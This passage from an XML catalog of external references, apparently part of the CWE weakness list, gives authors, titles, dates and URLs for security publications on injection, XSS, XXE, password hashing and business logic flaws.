		  <URL>http://www.cs.indiana.edu/cgi-pub/cshue/research/woot08.pdf</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-484">
		  <Author>Russ McRee</Author>
		  <Title>Open redirect vulnerabilities: definition and prevention</Title>
		  <Edition>Issue 17</Edition>
		  <Publication>(IN)SECURE</Publication>
		  <Publication_Year>2008</Publication_Year>
		  <Publication_Month>--07</Publication_Month>
		  <URL>http://www.net-security.org/dl/insecure/INSECURE-Mag-17.pdf</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-485">
		  <Author>Jason Lam</Author>
		  <Title>Top 25 Series - Rank 23 - Open Redirect</Title>
		  <Publication_Year>2010</Publication_Year>
		  <Publication_Month>--03</Publication_Month>
		  <Publication_Day>---25</Publication_Day>
		  <Publisher>SANS Software Security Institute</Publisher>
		  <URL>http://software-security.sans.org/blog/2010/03/25/top-25-series-rank-23-open-redirect</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-496">
		  <Author>OWASP</Author>
		  <Title>XML External Entity (XXE) Processing</Title>
		  <URL>https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-497">
		  <Author>Sascha Herzog</Author>
		  <Title>XML External Entity Attacks (XXE)</Title>
		  <Publication_Year>2010</Publication_Year>
		  <Publication_Month>--10</Publication_Month>
		  <Publication_Day>---20</Publication_Day>
		  <URL>https://www.owasp.org/images/5/5d/XML_Exteral_Entity_Attack.pdf</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-498">
		  <Author>Gregory Steuck</Author>
		  <Title>XXE (Xml eXternal Entity) Attack</Title>
		  <URL>http://www.securiteam.com/securitynews/6D0100A5PU.html</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-499">
		  <Author>WASC</Author>
		  <Title>XML External Entities (XXE) Attack</Title>
		  <URL>http://projects.webappsec.org/w/page/13247003/XML%20External%20Entities</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-500">
		  <Author>Bryan Sullivan</Author>
		  <Title>XML Denial of Service Attacks and Defenses</Title>
		  <Publication_Year>2009</Publication_Year>
		  <Publication_Month>--09</Publication_Month>
		  <URL>http://msdn.microsoft.com/en-us/magazine/ee335713.aspx</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-501">
		  <Author>Chris Cornutt</Author>
		  <Title>Preventing XXE in PHP</Title>
		  <URL>http://websec.io/2012/08/27/Preventing-XXE-in-PHP.html</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-52">
		  <Author>Greg Hoglund</Author>
		  <Author>Gary McGraw</Author>
		  <Title>Exploiting Software: How to Break Code</Title>
		  <Publication_Year>2004</Publication_Year>
		  <Publication_Month>--02</Publication_Month>
		  <Publication_Day>---27</Publication_Day>
		  <Publisher>Addison-Wesley</Publisher>
		  <URL>http://www.exploitingsoftware.com/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-528">
		  <Author>OWASP</Author>
		  <Title>Top 10 2007-Insecure Direct Object Reference</Title>
		  <Publication_Year>2007</Publication_Year>
		  <URL>http://www.owasp.org/index.php/Top_10_2007-A4</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-529">
		  <Title>HMAC</Title>
		  <Publication_Year>2011</Publication_Year>
		  <Publication_Month>--08</Publication_Month>
		  <Publication_Day>---18</Publication_Day>
		  <Publisher>Wikipedia</Publisher>
		  <URL>http://en.wikipedia.org/wiki/Hmac</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-53">
		  <Author>Alec Muffet</Author>
		  <Title>The night the log was forged</Title>
		  <URL>http://doc.novsu.ac.ru/oreilly/tcpip/puis/ch10_05.htm</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-531">
		  <Author>Web Application Security Consortium</Author>
		  <Title>XPath Injection</Title>
		  <URL>http://www.webappsec.org/projects/threat/classes/xpath_injection.shtml</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-535">
		  <Author>Sean Barnum</Author>
		  <Author>Michael Gegick</Author>
		  <Title>Separation of Privilege</Title>
		  <Publication_Year>2005</Publication_Year>
		  <Publication_Month>--12</Publication_Month>
		  <Publication_Day>---06</Publication_Day>
		  <URL>https://buildsecurityin.us-cert.gov/daisy/bsi/articles/knowledge/principles/357.html</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-542">
		  <Author>Jon Postel, Editor</Author>
		  <Title>RFC: 793, TRANSMISSION CONTROL PROTOCOL</Title>
		  <Publication_Year>1981</Publication_Year>
		  <Publication_Month>--09</Publication_Month>
		  <Publisher>Information Sciences Institute</Publisher>
		  <URL>http://www.ietf.org/rfc/rfc0793.txt</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-544">
		  <Author>Sean Barnum</Author>
		  <Author>Michael Gegick</Author>
		  <Title>Never Assuming that Your Secrets Are Safe</Title>
		  <Publication_Year>2005</Publication_Year>
		  <Publication_Month>--09</Publication_Month>
		  <Publication_Day>---14</Publication_Day>
		  <URL>https://buildsecurityin.us-cert.gov/daisy/bsi/articles/knowledge/principles/352.html</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-567">
		  <Author>Taimur Aslam</Author>
		  <Title>A Taxonomy of Security Faults in the UNIX Operating System</Title>
		  <Publication_Year>1995</Publication_Year>
		  <Publication_Month>--08</Publication_Month>
		  <Publication_Day>---01</Publication_Day>
		  <URL>http://ftp.cerias.purdue.edu/pub/papers/taimur-aslam/aslam-taxonomy-msthesis.pdf</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-568">
		  <Author>Taimur Aslam</Author>
		  <Author>Ivan Krsul</Author>
		  <Author>Eugene H. Spafford</Author>
		  <Title>Use of A Taxonomy of Security Faults</Title>
		  <Publication_Year>1995</Publication_Year>
		  <Publication_Month>--08</Publication_Month>
		  <Publication_Day>---01</Publication_Day>
		  <URL>http://csrc.nist.gov/nissc/1996/papers/NISSC96/paper057/PAPER.PDF</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-594">
		  <Author>Jason Lam</Author>
		  <Title>Top 25 Series - Rank 21 - Incorrect Permission Assignment for Critical Response</Title>
		  <Publication_Year>2010</Publication_Year>
		  <Publication_Month>--03</Publication_Month>
		  <Publication_Day>---24</Publication_Day>
		  <Publisher>SANS Software Security Institute</Publisher>
		  <URL>http://software-security.sans.org/blog/2010/03/24/top-25-series-rank-21-incorrect-permission-assignment-for-critical-response</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-62">
		  <Author>Mark Dowd</Author>
		  <Author>John McDonald</Author>
		  <Author>Justin Schuh</Author>
		  <Title>The Art of Software Security Assessment</Title>
		  <Edition>1st Edition</Edition>
		  <Publication_Year>2006</Publication_Year>
		  <Publisher>Addison Wesley</Publisher>
	   </External_Reference>
      <External_Reference Reference_ID="REF-622">
		  <Author>Frank Kim</Author>
		  <Title>Top 25 Series - Rank 15 - Improper Check for Unusual or Exceptional Conditions</Title>
		  <Publication_Year>2010</Publication_Year>
		  <Publication_Month>--03</Publication_Month>
		  <Publication_Day>---15</Publication_Day>
		  <Publisher>SANS Software Security Institute</Publisher>
		  <URL>http://blogs.sans.org/appsecstreetfighter/2010/03/15/top-25-series-rank-15-improper-check-for-unusual-or-exceptional-conditions/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-631">
		  <Author>OWASP</Author>
		  <Title>Password Storage Cheat Sheet</Title>
		  <URL>https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-632">
		  <Author>Thomas Ptacek</Author>
		  <Title>Enough With The Rainbow Tables: What You Need To Know About Secure Password Schemes</Title>
		  <Publication_Year>2007</Publication_Year>
		  <Publication_Month>--09</Publication_Month>
		  <Publication_Day>---10</Publication_Day>
		  <URL>http://www.securityfocus.com/blogs/262</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-633">
		  <Author>Robert Graham</Author>
		  <Title>The Importance of Being Canonical</Title>
		  <Publication_Year>2009</Publication_Year>
		  <Publication_Month>--02</Publication_Month>
		  <Publication_Day>---02</Publication_Day>
		  <URL>http://erratasec.blogspot.com/2009/02/importance-of-being-canonical.html</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-634">
		  <Author>James McGlinn</Author>
		  <Title>Password Hashing</Title>
		  <URL>http://phpsec.org/articles/2005/password-hashing.html</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-635">
		  <Author>Jeff Atwood</Author>
		  <Title>Rainbow Hash Cracking</Title>
		  <Publication_Year>2007</Publication_Year>
		  <Publication_Month>--09</Publication_Month>
		  <Publication_Day>---08</Publication_Day>
		  <URL>http://www.codinghorror.com/blog/archives/000949.html</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-636">
		  <Author>Jeff Atwood</Author>
		  <Title>Speed Hashing</Title>
		  <Publication_Year>2012</Publication_Year>
		  <Publication_Month>--04</Publication_Month>
		  <Publication_Day>---06</Publication_Day>
		  <URL>http://www.codinghorror.com/blog/2012/04/speed-hashing.html</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-637">
		  <Title>Rainbow table</Title>
		  <Publication_Year>2009</Publication_Year>
		  <Publication_Month>--03</Publication_Month>
		  <Publication_Day>---03</Publication_Day>
		  <Publisher>Wikipedia</Publisher>
		  <URL>http://en.wikipedia.org/wiki/Rainbow_table</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-667">
		  <Author>Rafal Los</Author>
		  <Title>Real-Life Example of a 'Business Logic Defect' (Screen Shots!)</Title>
		  <Publication_Year>2011</Publication_Year>
		  <URL>http://h30501.www3.hp.com/t5/Following-the-White-Rabbit-A/Real-Life-Example-of-a-Business-Logic-Defect-Screen-Shots/ba-p/22581</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-672">
		  <Author>Frank Kim</Author>
		  <Title>Top 25 Series - Rank 22 - Allocation of Resources Without Limits or Throttling</Title>
		  <Publication_Year>2010</Publication_Year>
		  <Publication_Month>--03</Publication_Month>
		  <Publication_Day>---23</Publication_Day>
		  <Publisher>SANS Software Security Institute</Publisher>
		  <URL>http://blogs.sans.org/appsecstreetfighter/2010/03/23/top-25-series-rank-22-allocation-of-resources-without-limits-or-throttling/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-685">
		  <Author>Pascal Meunier</Author>
		  <Title>Meta-Character Vulnerabilities</Title>
		  <Publication_Year>2008</Publication_Year>
		  <Publication_Month>--02</Publication_Month>
		  <Publication_Day>---20</Publication_Day>
		  <URL>http://www.cs.purdue.edu/homes/cs390s/slides/week09.pdf</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-686">
		  <Author>Robert Auger</Author>
		  <Title>OS Commanding</Title>
		  <Publication_Year>2009</Publication_Year>
		  <Publication_Month>--06</Publication_Month>
		  <URL>http://projects.webappsec.org/OS-Commanding</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-687">
		  <Author>Lincoln Stein</Author>
		  <Author>John Stewart</Author>
		  <Title>The World Wide Web Security FAQ</Title>
		  <Publication_Year>2002</Publication_Year>
		  <Publication_Month>--02</Publication_Month>
		  <Publication_Day>---04</Publication_Day>
		  <URL>http://www.w3.org/Security/Faq/wwwsf4.html</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-688">
		  <Author>Jordan Dimov, Cigital</Author>
		  <Title>Security Issues in Perl Scripts</Title>
		  <URL>http://www.cgisecurity.com/lib/sips.html</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-690">
		  <Author>Frank Kim</Author>
		  <Title>Top 25 Series - Rank 9 - OS Command Injection</Title>
		  <Publication_Year>2010</Publication_Year>
		  <Publication_Month>--02</Publication_Month>
		  <Publication_Day>---24</Publication_Day>
		  <Publisher>SANS Software Security Institute</Publisher>
		  <URL>http://blogs.sans.org/appsecstreetfighter/2010/02/24/top-25-series-rank-9-os-command-injection/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-694">
		  <Author>Ronald L. Rivest</Author>
		  <Author>Burt Kaliski</Author>
		  <Title>RSA Problem</Title>
		  <Publication_Year>2003</Publication_Year>
		  <Publication_Month>--12</Publication_Month>
		  <Publication_Day>---10</Publication_Day>
		  <URL>http://people.csail.mit.edu/rivest/RivestKaliski-RSAProblem.pdf</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-695">
		  <Title>Optimal Asymmetric Encryption Padding</Title>
		  <Publication_Year>2009</Publication_Year>
		  <Publication_Month>--07</Publication_Month>
		  <Publication_Day>---08</Publication_Day>
		  <Publisher>Wikipedia</Publisher>
		  <URL>http://en.wikipedia.org/wiki/Optimal_Asymmetric_Encryption_Padding</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-7">
		  <Author>Michael Howard</Author>
		  <Author>David LeBlanc</Author>
		  <Title>Writing Secure Code</Title>
		  <Edition>2nd Edition</Edition>
		  <Publication_Year>2002</Publication_Year>
		  <Publication_Month>--12</Publication_Month>
		  <Publication_Day>---04</Publication_Day>
		  <Publisher>Microsoft Press</Publisher>
		  <URL>https://www.microsoftpressstore.com/store/writing-secure-code-9780735617223</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-701">
		  <Author>Microsoft</Author>
		  <Title>Securing Device Objects</Title>
		  <URL>http://msdn.microsoft.com/en-us/library/ms794722.aspx</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-706">
		  <Author>Steve Christey</Author>
		  <Title>Unforgivable Vulnerabilities</Title>
		  <Publication_Year>2007</Publication_Year>
		  <Publication_Month>--08</Publication_Month>
		  <Publication_Day>---02</Publication_Day>
		  <URL>http://cve.mitre.org/docs/docs-2007/unforgivable.pdf</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-709">
		  <Author>Jeremiah Grossman</Author>
		  <Author>Robert "RSnake" Hansen</Author>
		  <Author>Petko "pdp" D. Petkov</Author>
		  <Author>Anton Rager</Author>
		  <Author>Seth Fogie</Author>
		  <Title>XSS Attacks</Title>
		  <Publication_Year>2007</Publication_Year>
		  <Publisher>Syngress</Publisher>
	   </External_Reference>
      <External_Reference Reference_ID="REF-712">
		  <Title>Cross-site scripting</Title>
		  <Publication_Year>2008</Publication_Year>
		  <Publication_Month>--08</Publication_Month>
		  <Publication_Day>---26</Publication_Day>
		  <Publisher>Wikipedia</Publisher>
		  <URL>http://en.wikipedia.org/wiki/Cross-site_scripting</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-714">
		  <Author>RSnake</Author>
		  <Title>XSS (Cross Site Scripting) Cheat Sheet</Title>
		  <URL>http://ha.ckers.org/xss.html</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-715">
		  <Author>Microsoft</Author>
		  <Title>Mitigating Cross-site Scripting With HTTP-only Cookies</Title>
		  <URL>http://msdn.microsoft.com/en-us/library/ms533046.aspx</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-716">
		  <Author>Mark Curphey, Microsoft</Author>
		  <Title>Anti-XSS 3.0 Beta and CAT.NET Community Technology Preview now Live!</Title>
		  <URL>http://blogs.msdn.com/cisg/archive/2008/12/15/anti-xss-3-0-beta-and-cat-net-community-technology-preview-now-live.aspx</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-718">
		  <Author>Ivan Ristic</Author>
		  <Title>XSS Defense HOWTO</Title>
		  <URL>http://blog.modsecurity.org/2008/07/do-you-know-how.html</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-719">
		  <Author>OWASP</Author>
		  <Title>Web Application Firewall</Title>
		  <URL>http://www.owasp.org/index.php/Web_Application_Firewall</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-720">
		  <Author>Web Application Security Consortium</Author>
		  <Title>Web Application Firewall Evaluation Criteria</Title>
		  <URL>http://www.webappsec.org/projects/wafec/v1/wasc-wafec-v1.0.html</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-721">
		  <Author>RSnake</Author>
		  <Title>Firefox Implements httpOnly And is Vulnerable to XMLHTTPRequest</Title>
		  <Publication_Year>2007</Publication_Year>
		  <Publication_Month>--07</Publication_Month>
		  <Publication_Day>---19</Publication_Day>
	   </External_Reference>
      <External_Reference Reference_ID="REF-722">
		  <Title>XMLHttpRequest allows reading HTTPOnly cookies</Title>
		  <Publisher>Mozilla</Publisher>
		  <URL>https://bugzilla.mozilla.org/show_bug.cgi?id=380418</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-723">
		  <Title>Apache Wicket</Title>
		  <URL>http://wicket.apache.org/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-724">
		  <Author>OWASP</Author>
		  <Title>XSS (Cross Site Scripting) Prevention Cheat Sheet</Title>
		  <URL>http://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-725">
		  <Author>OWASP</Author>
		  <Title>DOM based XSS Prevention Cheat Sheet</Title>
		  <URL>http://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-726">
		  <Author>Jason Lam</Author>
		  <Title>Top 25 series - Rank 1 - Cross Site Scripting</Title>
		  <Publication_Year>2010</Publication_Year>
		  <Publication_Month>--02</Publication_Month>
		  <Publication_Day>---22</Publication_Day>
		  <Publisher>SANS Software Security Institute</Publisher>
		  <URL>http://blogs.sans.org/appsecstreetfighter/2010/02/22/top-25-series-rank-1-cross-site-scripting/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-729">
		  <Author>Johannes Ullrich</Author>
		  <Title>Top 25 Series - Rank 11 - Hardcoded Credentials</Title>
		  <Publication_Year>2010</Publication_Year>
		  <Publication_Month>--03</Publication_Month>
		  <Publication_Day>---10</Publication_Day>
		  <Publisher>SANS Software Security Institute</Publisher>
		  <URL>http://blogs.sans.org/appsecstreetfighter/2010/03/10/top-25-series-rank-11-hardcoded-credentials/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-754">
		  <Author>Frank Kim</Author>
		  <Title>Top 25 Series - Rank 6 - Reliance on Untrusted Inputs in a Security Decision</Title>
		  <Publication_Year>2010</Publication_Year>
		  <Publication_Month>--03</Publication_Month>
		  <Publication_Day>---05</Publication_Day>
		  <Publisher>SANS Software Security Institute</Publisher>
		  <URL>http://blogs.sans.org/appsecstreetfighter/2010/03/05/top-25-series-rank-6-reliance-on-untrusted-inputs-in-a-security-decision/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-756">
		  <Author>Scott Mitchell</Author>
		  <Title>Understanding ASP.NET View State</Title>
		  <Publication_Year>2004</Publication_Year>
		  <Publication_Month>--05</Publication_Month>
		  <Publication_Day>---15</Publication_Day>
		  <Publisher>Microsoft</Publisher>
		  <URL>http://msdn.microsoft.com/en-us/library/ms972976.aspx</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-76">
		  <Author>Sean Barnum</Author>
		  <Author>Michael Gegick</Author>
		  <Title>Least Privilege</Title>
		  <Publication_Year>2005</Publication_Year>
		  <Publication_Month>--09</Publication_Month>
		  <Publication_Day>---14</Publication_Day>
		  <URL>https://buildsecurityin.us-cert.gov/daisy/bsi/articles/knowledge/principles/351.html</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-773">
		  <Author>Daniel Kulp</Author>
		  <Title>Apache CXF Security Advisory (CVE-2010-2076)</Title>
		  <Publication_Year>2010</Publication_Year>
		  <Publication_Month>--06</Publication_Month>
		  <Publication_Day>---16</Publication_Day>
		  <URL>http://svn.apache.org/repos/asf/cxf/trunk/security/CVE-2010-2076.pdf</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-778">
		  <Author>Jeremiah Grossman</Author>
		  <Title>Third-Party Web Widget Security FAQ</Title>
		  <URL>http://jeremiahgrossman.blogspot.com/2010/07/third-party-web-widget-security-faq.html</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-795">
		  <Author>Jeremiah Grossman</Author>
		  <Title>Business Logic Flaws and Yahoo Games</Title>
		  <Publication_Year>2006</Publication_Year>
		  <Publication_Month>--12</Publication_Month>
		  <Publication_Day>---08</Publication_Day>
		  <URL>http://jeremiahgrossman.blogspot.com/2006/12/business-logic-flaws.html</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-796">
		  <Author>Jeremiah Grossman</Author>
		  <Title>Seven Business Logic Flaws That Put Your Website At Risk</Title>
		  <Publication_Year>2007</Publication_Year>
		  <Publication_Month>--10</Publication_Month>
		  <URL>http://www.whitehatsec.com/home/assets/WP_bizlogic092407.pdf</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-797">
		  <Author>WhiteHat Security</Author>
		  <Title>Business Logic Flaws</Title>
		  <URL>http://www.whitehatsec.com/home/solutions/BL_auction.html</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-799">
		  <Author>Rafal Los</Author>
		  <Author>Prajakta Jagdale</Author>
		  <Title>Defying Logic: Theory, Design, and Implementation of Complex Systems for Testing Application Logic</Title>
		  <Publication_Year>2011</Publication_Year>
		  <URL>http://www.slideshare.net/RafalLos/defying-logic-business-logic-testing-with-automation</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-801">
		  <Author>Viktoria Felmetsger</Author>
		  <Author>Ludovico Cavedon</Author>
		  <Author>Christopher Kruegel</Author>
		  <Author>Giovanni Vigna</Author>
		  <Title>Toward Automated Detection of Logic Vulnerabilities in Web Applications</Title>
		  <Publication>USENIX Security Symposium 2010</Publication>
		  <Publication_Year>2010</Publication_Year>
		  <Publication_Month>--08</Publication_Month>
		  <URL>http://www.usenix.org/events/sec10/tech/full_papers/Felmetsger.pdf</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-802">
		  <Author>Faisal Nabi</Author>
		  <Title>Designing a Framework Method for Secure Business Application Logic Integrity in e-Commerce Systems</Title>
		  <Publication>International Journal of Network Security, Vol.12, No.1</Publication>
		  <Publication_Year>2011</Publication_Year>
		  <URL>http://ijns.femto.com.tw/contents/ijns-v12-n1/ijns-2011-v12-n1-p29-41.pdf</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-806">
		  <Author>WASC</Author>
		  <Title>Insufficient Process Validation</Title>
		  <URL>http://projects.webappsec.org/w/page/13246943/Insufficient-Process-Validation</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-859">
		  <Author>Steven Christey</Author>
		  <Title>Argument injection issues</Title>
		  <URL>http://www.securityfocus.com/archive/1/archive/1/460089/100/100/threaded</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-867">
		  <Author>OWASP</Author>
		  <Title>SQL Injection Prevention Cheat Sheet</Title>
		  <URL>http://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-868">
		  <Author>Steven Friedl</Author>
		  <Title>SQL Injection Attacks by Example</Title>
		  <Publication_Year>2007</Publication_Year>
		  <Publication_Month>--10</Publication_Month>
		  <Publication_Day>---10</Publication_Day>
		  <URL>http://www.unixwiz.net/techtips/sql-injection.html</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-869">
		  <Author>Ferruh Mavituna</Author>
		  <Title>SQL Injection Cheat Sheet</Title>
		  <Publication_Year>2007</Publication_Year>
		  <Publication_Month>--03</Publication_Month>
		  <Publication_Day>---15</Publication_Day>
		  <URL>http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-870">
		  <Author>David Litchfield</Author>
		  <Author>Chris Anley</Author>
		  <Author>John Heasman</Author>
		  <Author>Bill Grindlay</Author>
		  <Title>The Database Hacker's Handbook: Defending Database Servers</Title>
		  <Publication_Year>2005</Publication_Year>
		  <Publication_Month>--07</Publication_Month>
		  <Publication_Day>---14</Publication_Day>
		  <Publisher>Wiley</Publisher>
	   </External_Reference>
      <External_Reference Reference_ID="REF-871">
		  <Author>David Litchfield</Author>
		  <Title>The Oracle Hacker's Handbook: Hacking and Defending Oracle</Title>
		  <Publication_Year>2007</Publication_Year>
		  <Publication_Month>--01</Publication_Month>
		  <Publication_Day>---30</Publication_Day>
		  <Publisher>Wiley</Publisher>
	   </External_Reference>
      <External_Reference Reference_ID="REF-872">
		  <Author>Microsoft</Author>
		  <Title>SQL Injection</Title>
		  <Publication_Year>2008</Publication_Year>
		  <Publication_Month>--12</Publication_Month>
		  <URL>http://msdn.microsoft.com/en-us/library/ms161953.aspx</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-873">
		  <Author>Microsoft Security Vulnerability Research &amp; Defense</Author>
		  <Title>SQL Injection Attack</Title>
		  <URL>http://blogs.technet.com/swi/archive/2008/05/29/sql-injection-attack.aspx</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-874">
		  <Author>Michael Howard</Author>
		  <Title>Giving SQL Injection the Respect it Deserves</Title>
		  <Publication_Year>2008</Publication_Year>
		  <Publication_Month>--05</Publication_Month>
		  <Publication_Day>---15</Publication_Day>
		  <URL>http://blogs.msdn.com/sdl/archive/2008/05/15/giving-sql-injection-the-respect-it-deserves.aspx</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-875">
		  <Author>Frank Kim</Author>
		  <Title>Top 25 Series - Rank 2 - SQL Injection</Title>
		  <Publication_Year>2010</Publication_Year>
		  <Publication_Month>--03</Publication_Month>
		  <Publication_Day>---01</Publication_Day>
		  <Publisher>SANS Software Security Institute</Publisher>
		  <URL>http://blogs.sans.org/appsecstreetfighter/2010/03/01/top-25-series-rank-2-sql-injection/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-879">
		  <Author>SPI Dynamics</Author>
		  <Title>Web Applications and LDAP Injection</Title>
	   </External_Reference>
      <External_Reference Reference_ID="REF-882">
		  <Author>Amit Klein</Author>
		  <Title>Blind XPath Injection</Title>
		  <Publication_Year>2004</Publication_Year>
		  <Publication_Month>--05</Publication_Month>
		  <Publication_Day>---19</Publication_Day>
		  <URL>http://www.modsecurity.org/archive/amit/blind-xpath-injection.pdf</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-9">
		  <Author>Santos, J. C. S.</Author>
		  <Author>Tarrit, K.</Author>
		  <Author>Mirakhorli, M.</Author>
		  <Title>A Catalog of Security Architecture Weaknesses.</Title>
		  <Publication>2017 IEEE International Conference on Software Architecture (ICSA)</Publication>
		  <Publication_Year>2017</Publication_Year>
		  <URL>https://design.se.rit.edu/papers/cawe-paper.pdf</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-908">
		  <Author>Solar Designer</Author>
		  <Title>Password hashing at scale</Title>
		  <Publication_Year>2012</Publication_Year>
		  <Publication_Month>--10</Publication_Month>
		  <Publication_Day>---01</Publication_Day>
		  <URL>http://www.openwall.com/presentations/YaC2012-Password-Hashing-At-Scale/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-909">
		  <Author>Solar Designer</Author>
		  <Title>New developments in password hashing: ROM-port-hard functions</Title>
		  <Publication_Year>2012</Publication_Year>
		  <Publication_Month>--11</Publication_Month>
		  <URL>http://www.openwall.com/presentations/ZeroNights2012-New-In-Password-Hashing/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-921">
		  <Author>Android Open Source Project</Author>
		  <Title>Security Tips</Title>
		  <Publication_Year>2013</Publication_Year>
		  <Publication_Month>--07</Publication_Month>
		  <Publication_Day>---16</Publication_Day>
		  <URL>http://developer.android.com/training/articles/security-tips.html#StoringData</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-928">
		  <Author>Ulf Harnhammar</Author>
		  <Title>CRLF Injection</Title>
		  <Publication>Bugtraq</Publication>
		  <Publication_Year>2002</Publication_Year>
		  <Publication_Month>--05</Publication_Month>
		  <Publication_Day>---07</Publication_Day>
		  <URL>http://marc.info/?l=bugtraq&amp;m=102088154213630&amp;w=2</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-938">
		  <Author>Guillaume Ross</Author>
		  <Title>Scheming for Privacy and Security</Title>
		  <Publication_Year>2013</Publication_Year>
		  <Publication_Month>--11</Publication_Month>
		  <Publication_Day>---11</Publication_Day>
		  <URL>http://brooksreview.net/2013/11/guest-post_scheming-for-privacy-and-security/</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-941">
		  <Author>US-CERT</Author>
		  <Title>UDP-based Amplification Attacks</Title>
		  <Publication_Year>2014</Publication_Year>
		  <Publication_Month>--01</Publication_Month>
		  <Publication_Day>---17</Publication_Day>
		  <URL>https://www.us-cert.gov/ncas/alerts/TA14-017A</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-942">
		  <Author>Fortify</Author>
		  <Title>Android Bad Practices: Sticky Broadcast</Title>
		  <URL>http://www.hpenterprisesecurity.com/vulncat/en/vulncat/java/android_bad_practices_sticky_broadcast.html</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-943">
		  <Author>Apurva Udaykumar</Author>
		  <Title>Setting a crossdomain.xml file for HTTP streaming</Title>
		  <Publication_Year>2012</Publication_Year>
		  <Publication_Month>--11</Publication_Month>
		  <Publication_Day>---19</Publication_Day>
		  <Publisher>Adobe</Publisher>
		  <URL>http://www.adobe.com/devnet/adobe-media-server/articles/cross-domain-xml-for-streaming.html</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-944">
		  <Author>Adobe</Author>
		  <Title>Cross-domain policy for Flash movies</Title>
		  <Publisher>Adobe</Publisher>
		  <URL>http://kb2.adobe.com/cps/142/tn_14213.html</URL>
	   </External_Reference>
      <External_Reference Reference_ID="REF-945">
		  <Author>Microsoft Corporation</Author>
		  <Title>HTTP Communication and Security with Silverlight</Title>
		  <URL>http://msdn.microsoft.com/en-us/library/cc838250.aspx</URL>
